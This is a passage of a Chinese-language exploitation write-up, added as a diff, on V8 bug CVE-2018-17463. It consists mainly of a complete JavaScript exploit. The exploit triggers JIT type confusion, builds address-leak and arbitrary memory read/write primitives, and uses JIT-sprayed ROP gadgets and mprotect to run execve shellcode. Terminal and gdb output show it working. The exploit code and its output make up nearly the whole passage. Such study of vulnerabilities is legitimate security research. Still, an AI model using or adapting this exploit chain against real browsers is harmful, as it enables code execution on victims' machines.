+  - 會執行到 `raw_instruction_start()`，回傳 `code` + 0x40 (kHeaderSize)，而 `code` + 0x40 開始就是 JIT 的 code，只不過前面有一些 check，到 `code` + 0xb0 附近才開始執行我們的 function
+  - 而這個區間為 R-X，又因為 `return` value 做偏移後可以當作 gadget，像是：
+
+  ```js
+  stack_piviot_gadget : function() {
+  	return 0xc3268b48|0;
+  },
+  ```
+
+  做完偏移後就能看成：
+
+  ```asm
+  0:   48 8b 26                mov    rsp, QWORD PTR [rsi]
+  3:   c3                      ret
+  ```
+
+  因此透過此方式任意控制 gadget。
+
+
+
+**final exploit**
+
+```js
+const JIT_ITERATION = 0x10000;
+const PROP_NUM = 32;
+
+{
+    let f64 = new Float64Array(1);
+    let u64 = new BigUint64Array(f64.buffer);
+
+    // Feature request: unboxed BigInt properties so these aren't needed =)
+    Number.prototype.toBigInt = function toBigInt() {
+        f64[0] = this;
+        return u64[0];
+    };
+
+    BigInt.prototype.toNumber = function toNumber() {
+        u64[0] = this;
+        return f64[0];
+    };
+}
+
+function checkVuln() {
+    function hax(o) {
+        // force a CheckMaps node before the property access
+        // must be inline property
+        o.inline;
+
+        // JSCreateObject --> ... --> JSObject::OptimizeAsPrototype
+        // and this function will modify prototype and create a new map
+        // it will transition the OOL property storage to dictionary mode (.outline)
+        Object.create(o);
+
+        // now JIT code is accessing a NameDictionary but it believes its loading from a FixedArray :)
+        return o.outline;
+    }
+    for (let i = 0; i < JIT_ITERATION; i++) {
+        let o = {inline: 0x1337}
+        o.outline = 0x1338;
+        if (hax(o) != 0x1338)
+            return true;
+    }
+    return false;
+}
+
+// force to garbage collection --> move objects to a stable position in
+// memory (OldSpace) before leaking their addresses
+function gc() {
+    for (let i = 0; i < 100; i++)
+        new ArrayBuffer(0x100000);
+}
+
+// make an object with one inline and numerous out-of-line properties
+function makeObj(prop_vals) {
+    let o = {inline: 0x1337};
+    for (let i = 0; i < PROP_NUM; i++)
+        Object.defineProperty(o, 'p' + i, {
+            writable: true,
+            value: prop_vals[i],
+        });
+    return o;
+}
+
+// find a pair (p1, p2) of properties such that p1 is stored at the same
+// offset in the FixedArray as p2 is in the NameDictionary
+let p1, p2;
+function findOverlappingProperties() {
+    let prop_names = [];
+    for (let i = 0; i < PROP_NUM; i++)
+        prop_names[i] = 'p' + i;
+
+    let command = `
+        function hax(o) {
+            o.inline;
+            this.Object.create(o);
+            ${prop_names.map((p) => `let ${p} = o.${p};`).join('\n')}
+            
+
+            // if bug happens, o.0 ~ o.p31 are accessed as FixArray
+            // but actually they are NameDictionary
+            // return [o.p0 ~ o.p31]
+            return [${prop_names.join(', ')}];
+        }
+    `;
+    eval(command);
+
+    let prop_vals = [];
+    for (let i = 1; i < PROP_NUM; i++)
+        // there are some unrelated, small-valued SMIs in the dictionary
+        // however they are all positive, so use negative SMIs
+        // don't use -0 though, that would be represented as a double
+        prop_vals[i] = -i;
+
+    // JIT + find overlap property
+    for (let j = 0; j < JIT_ITERATION; j++) {
+        let obj = makeObj(prop_vals); // obj -> PropertyArray
+        let r = hax(obj); // obj -> NameDictionary
+        /*
+        original:
+        1 -> -1
+        2 -> -2
+        3 -> -3
+        4 -> -4
+        ...
+        8 -> -8
+
+        after:
+        1 -> 12345678
+        2 -> -8787
+        3 -> -3 (same index, nonono...)
+        4 -> -8 (overlap with index 8)
+        ...
+        */
+
+        // traverse all NameDictionary array and find if there is a value equal -i
+        // but index != -i
+        for (let i = 1; i < PROP_NUM; i++) {
+            // properties that overlap with themselves cannot be used
+            if (i !== -r[i] /* index != -r[i] (overlap themselves) */ &&
+                r[i] < 0 /* ignore redundant dictionary value */ &&
+                r[i] > -PROP_NUM /* property value is in range -1 ~ -PROP_NUM+1 */) {
+                [p1, p2] = [i, -r[i]];
+                // %DebugPrint(r); // b v8::base::ieee754::cosh
+                // /Math.cosh(1);
+                return;
+            }
+        }
+    }
+}
+
+function addrof(obj) {
+    eval(`
+        function hax(o) {
+            o.inline;
+            this.Object.create(o);
+            return o.p${p1}.x1;
+        }
+    `);
+
+    let prop_vals = [];
+    // property p1 should have the same Map as the one used in
+    // corrupt() for simplicity
+    prop_vals[p1] = {x1: 13.37, x2: 13.38};
+    prop_vals[p2] = {y1: obj}; // an object contain our target
+
+    let boom = makeObj(prop_vals);
+    for (let i = 0; i < JIT_ITERATION; i++) {
+        let boom = makeObj(prop_vals);
+        let res = hax(boom);
+        // p2 in FixArray ----> p1 in NameDictionary
+        // p1.x1 (double) --> p2.y1 (obj) ===> show obj address as double
+        if (res != 13.37)
+            return res.toBigInt() - 1n; // tagged bit
+    }
+
+    throw "[-] addrof failed";
+}
+
+// corrupt the backingStore pointer of ab1 to
+// point to ab2
+function corrupt(victim, new_val) {
+    eval(`
+        function hax(o) {
+            o.inline;
+            this.Object.create(o);
+            let orig = o.p${p1}.x2;
+            // overwrite ab1 BS to ab2
+            // overwrite p1.x2 ---> p2.
+            o.p${p1}.x2 = ${new_val.toNumber()};
+            return orig;
+        }
+    `);
+
+    // x2 overlaps with the backingStore pointer of the ArrayBuffer
+
+    // why ? because o has two inline property x1 and x2, and inline property
+    // starts from 0x18 (after map, out-of-line properties, element pointer),
+    // and x2 is located at 0x20~0x27, which equals to backingStore pointer
+    // in ArrayBuffer(map, properties, element, byteLength, backingStore ...)
+    
+    let prop_vals = [];
+    let o = {x1: 13.37, x2: 13.38};
+    prop_vals[p1] = o; // will become an object map
+    prop_vals[p2] = victim; // will become ArrayBuffer
+    // if use {y1: victim}, will become an object map
+    for (let i = 0; i < JIT_ITERATION; i++) {
+        o.x2 = 13.38; // update to original value 
+        let boom = makeObj(prop_vals);
+        let r = hax(boom);
+        if (r != 13.38)
+            return r.toBigInt();
+    }
+
+    throw "[-] CorruptArrayBuffer failed";
+}
+
+if (checkVuln()) {
+    print("[*] 1. vuln CVE-2018-17463 exists");
+
+    findOverlappingProperties();
+    print(`[*] 2. find overlap property ${p1} ${p2}`);
+
+    let ab2 = new ArrayBuffer(1024);
+    let ab1 = new ArrayBuffer(1024);
+
+    gc();
+    let ab2_addr = addrof(ab2);
+    print("[*] 3. leak the address of ab2");
+    print(`[+] leak: ab2 address --- 0x${ab2_addr.toString(16)}`);
+
+    let ab1_orig_BS = corrupt(ab1, ab2_addr);
+    let driver = new BigUint64Array(ab1);
+    let ab2_orig_BS = driver[4]; // ab1.backingStore ----> ab2
+    print(`[*] 4. corrupt the BS ptr of ab1 to ab2`);
+    print(`[+] leak: ab1_orig_BS --- 0x${ab1_orig_BS.toString(16)}`);
+    print(`[+] leak: ab2_orig_BS --- 0x${ab2_orig_BS.toString(16)}`);
+    
+    // construct the memory read/write primitives
+    let memory = {
+        write(addr, bytes) {
+            driver[4] = addr; // overwrite ab2 backingStore ptr
+            let memview = new Uint8Array(ab2); // uint8
+            memview.set(bytes);
+        }, read(addr, len) {
+            driver[4] = addr;
+            let memview = new Uint8Array(ab2);
+            return memview.subarray(0, len);
+        }, write64(addr, ptr) {
+            driver[4] = addr;
+            let memview = new BigUint64Array(ab2);
+            memview[0] = ptr;
+        }, read64(addr) {
+            driver[4] = addr;
+            let memview = new BigUint64Array(ab2);
+            return memview[0];
+        }, addrof(obj) {
+            ab2.leakMe = obj;
+            let props = this.read64(ab2_addr + 8n); // get ool property ptr
+            return this.read64(props + 15n) - 1n; // read ool property first element
+        }, fixup(obj) {
+            let ab1_addr = this.addrof(ab1);
+            let ab2_addr = this.addrof(ab2);
+            this.write64(ab1_addr + 32n, ab1_orig_BS);
+            this.write64(ab2_addr + 32n, ab2_orig_BS);
+        }
+    };
+    print("[*] constructed memory read/write primitives");
+    print("[*] use JIT spray to get arbitrary code execution");
+    let exploit_victim = {
+        trigger : function(binsh) {
+            return 0xdeadbeef;
+        },
+        //piviot (%rsi + 0x3f) -> rbp
+        stack_piviot_gadget : function() {
+            return 0x3f6e8b48 | 0;
+        },
+        //pop rsi, pop rdi, pop rax
+        pop_gadget: function() {
+            return 0xc3585f5e | 0;
+        },
+        //pop rdx; syscall; ret
+        syscall_gadget: function() {
+            //return 0xcc80cd5a|0;
+            return 0xc3050f5a | 0;
+        }
+    };
+
+    for (let i = 0; i < JIT_ITERATION; i++) {
+        exploit_victim.trigger();
+        exploit_victim.pop_gadget();
+        exploit_victim.syscall_gadget();
+        exploit_victim.stack_piviot_gadget();
+    }
+
+    /* ---------------- arbitrary code execution ---------------- */
+    let exploit_victim_addr = memory.addrof(exploit_victim);
+    function get_gadget_addr(func_off, code_off) {
+        let jsfunc = memory.read64(exploit_victim_addr + func_off) - 1n; // get v8::intertal::JSFunction
+        let code = memory.read64(jsfunc + 0x30n) - 1n; // get v8::internal::Code
+        let gadget = code + 0xb0n + code_off; // although insn starts from 0x40, we shift it to our gadget
+        return gadget;
+    }
+
+    // we should allocate memory together, otherwise memory layout may be changed
+    let rop_chain_buf = new ArrayBuffer(4096);
+    let rop_chain = new BigUint64Array(rop_chain_buf);
+    /*
+    mov rax, 0x3b
+    pop rdi
+    xor rsi, rsi
+    xor rdx, rdx
+    syscall
+    */
+    let shellcode = new Uint8Array([0x48, 0xc7, 0xc0, 0x3b, 0x0, 0x0, 0x0, 0x5f, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0xf, 0x5]);
+    let shellcode_addr = memory.addrof(shellcode);
+    shellcode_addr = memory.read64(shellcode_addr + 0x10n) - 1n; // get JSTypedArray elements
+    shellcode_addr = shellcode_addr + 0x20n; // shift to shellcode
+    print(`[+] shellcode address --- 0x${shellcode_addr.toString(16)}`);
+    
+    let mov_rbp_qptr_rdi_3f = get_gadget_addr(0x20n, 5n);
+    let pop_rsi_rdi_rax = get_gadget_addr(0x28n, 0xan);
+    let pop_rdx_syscall = get_gadget_addr(0x30n, 0xan);
+    let binsh_addr = memory.addrof("/bin/id\x00") + 0x10n;
+
+    print(`[+] gadget mov_rbp_qptr_rdi_3f --- 0x${mov_rbp_qptr_rdi_3f.toString(16)}`);
+    print(`[+] gadget pop_rsi_rdi_rax --- 0x${pop_rsi_rdi_rax.toString(16)}`);
+    print(`[+] gadget pop_rdx_syscall --- 0x${pop_rdx_syscall.toString(16)}`);
+    print(`[+] binsh string --- 0x${binsh_addr.toString(16)}`);
+
+    rop_chain[0] = 0xdeadbeefn; // dummy for "pop rbp"
+    rop_chain[1] = pop_rsi_rdi_rax;
+    rop_chain[2] = 0xdeadbeefn; // dummy for "ret 8"
+    rop_chain[3] = 0x1000n; // len
+    rop_chain[4] = shellcode_addr & 0xFFFFFFFFFFFFF000n; // start
+    rop_chain[5] = 10n; // mprotect
+    rop_chain[6] = pop_rdx_syscall;
+    rop_chain[7] = 7n; // prot
+    rop_chain[8] = shellcode_addr;
+    rop_chain[9] = binsh_addr;
+
+    let rop_chain_addr = memory.addrof(rop_chain);
+    rop_chain_addr = memory.read64(rop_chain_addr + 0x10n) - 1n; // get JSTypedArray elements
+    rop_chain_addr = memory.read64(rop_chain_addr + 0x18n); // get backingStore ptr, and it is what we need
+    print(`[+] rop chain --- 0x${rop_chain_addr.toString(16)}`);
+
+    exploit_victim_addr = memory.addrof(exploit_victim);
+    let trigger_addr = memory.read64(exploit_victim_addr + 0x18n) - 1n;
+    let trigger_blockctx = memory.read64(trigger_addr + 0x20n) - 1n;
+    print(`[+] trigger func --- 0x${trigger_addr.toString(16)}`);
+    print(`[+] trigger blockctx --- 0x${trigger_blockctx.toString(16)}`);
+    // overwrite code to stack pivoting gadget
+    memory.write64(trigger_addr + 0x30n, mov_rbp_qptr_rdi_3f - 0x40n);
+    // overwrite ctx + 0x40 to gadget, and it is the last thing
+    memory.write64(trigger_blockctx + 0x40n, rop_chain_addr);
+    
+    // When JIT code is called, the rsi will be block context ptr,
+    // so we call gadget "mov rbp, qword ptr [rsi + 0x3f]", and it will get data from
+    // trigger_blockctx + 0x40, which we have overwrited rbp to our rop_chain_addr
+    // P.S. if yoy overwrite trigger_blockctx directly, you will get SIGILL
+
+    // Finally we pivot the stack and get shell !
+    exploit_victim.trigger();
+} else {
+    print("[*] Safe v8 version");
+}
+```
+
+
+
+terminal:
+
+```
+[*] 1. vuln CVE-2018-17463 exists
+[*] 2. find overlap property 9 3
+[*] 3. leak the address of ab2
+[+] leak: ab2 address --- 0x3cdd1307fe28
+[*] 4. corrupt the BS ptr of ab1 to ab2
+[+] leak: ab1_orig_BS --- 0x564a150c5540
+[+] leak: ab2_orig_BS --- 0x564a150cd5a0
+[*] constructed memory read/write primitives
+[*] use JIT spray to get arbitrary code execution
+[+] shellcode address --- 0x3565ae1f4b80
+[+] gadget mov_rbp_qptr_rdi_3f --- 0x1e9fdebc26b5
+[+] gadget pop_rsi_rdi_rax --- 0x1e9fdebc247a
+[+] gadget pop_rdx_syscall --- 0x1e9fdebc259a
+[+] binsh string --- 0xbc2aba232e8
+[+] rop chain --- 0x564a150d43a0
+[+] trigger func --- 0x3565ae1f4738
+[+] trigger blockctx --- 0xbc2aba25648
+V8 version 7.1.0 (candidate)
+d8> exploit_victim.trigger()
+```
+
+gdb:
+
+```
+ RAX  0x3b
+ RBX  0x1
+ RCX  0x1e9fdebc259d ◂— ret
+*RDX  0x0
+ RDI  0xbc2aba232e8 ◂— 0x64692f6e69622f /* '/bin/id' */
+ RSI  0x0
+ R8   0x1
+ R9   0x4c
+ R10  0x2422490025a1 ◂— 0x2422490025 /* '%' */
+ R11  0x316
+ R12  0xffffffffffffffff
+ R13  0x564a15043f48 —▸ 0x2422490029c1 ◂— 0x2422490022 /* '"' */
+ R14  0xea2c38f8691 ◂— 0x2422490034 /* '4' */
+ R15  0x564a15085ec0 —▸ 0x7f3d3d83b520 (Builtins_WideHandler) ◂— lea    rbx, [rip - 7]
+ RBP  0xdeadbeef
+ RSP  0x564a150d43f0 ◂— 0x0
+*RIP  0x3565ae1f4b8e ◂— syscall  /* 0x242249003399050f */
+─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────
+   0x1e9fdebc259d    ret
+    ↓
+   0x3565ae1f4b80    mov    rax, 0x3b
+   0x3565ae1f4b87    pop    rdi
+   0x3565ae1f4b88    xor    rsi, rsi
+   0x3565ae1f4b8b    xor    rdx, rdx
+ ► 0x3565ae1f4b8e    syscall  <SYS_execve>
+        path: 0xbc2aba232e8 ◂— 0x64692f6e69622f /* '/bin/id' */
+        argv: 0x0
+        envp: 0x0
+```
+
+最後在 `gdb` mode 有取得 shell，但是不知道為什麼直接跑 `./d8 ./pwn.js` 不會有 shell。
 
